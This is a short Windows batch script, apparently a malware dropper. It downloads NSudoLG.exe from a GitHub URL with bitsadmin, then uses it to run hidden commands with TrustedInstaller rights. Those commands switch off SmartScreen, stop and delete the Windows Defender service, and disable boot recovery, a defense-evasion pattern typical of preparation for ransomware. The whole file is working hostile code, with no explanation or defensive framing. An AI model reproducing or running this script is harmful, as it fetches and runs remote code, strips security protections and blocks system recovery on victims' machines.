@echo off

cd C:\Users\

bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/whaomi23/HolaMundo./main/NSudoLG.exe C:\Users\NSudoLG.exe

start NsudoLG.exe -U:T reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f
start NSudoLG.exe -U:T -ShowWindowMode:Hide  sc stop  windefend  
start NSudoLG.exe -U:T -ShowWindowMode:Hide  sc delete  windefend  
start NSudoLG.exe -U:T -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No
start NSudoLG.exe -U:T -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures